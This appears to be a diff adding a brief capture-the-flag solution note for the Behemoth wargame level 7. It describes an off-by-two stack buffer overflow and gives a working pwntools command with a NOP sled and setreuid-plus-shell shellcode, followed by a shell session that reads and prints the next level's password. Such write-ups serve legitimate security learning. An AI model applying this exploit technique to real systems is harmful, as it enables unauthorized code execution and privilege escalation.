@@ -1,0 +1,9 @@
+Overflow the buffer by 2 bytes (first controlled by us - second is the terminating NULL)
+We need to have a stack where 0xffff00xx is pointing to the some place on the stack where the prev element will point us to ur shellcode.
+
+
+behemoth7@behemoth:/tmp/tmp.nIe3up0JXc$ /behemoth/behemoth7 `python -c "from pwn import *; print 'A'*512 + 'B'*24 + '\xf0'"` `python -c "from pwn import *; print '\x90\x90\x90\x90' * 460 + '\x90'*4096*4 + asm(shellcraft.setreuid() + shellcraft.sh())"`
+$ cat /etc/behemoth_pass/behemoth8
+pheewij7Ae
+$
+
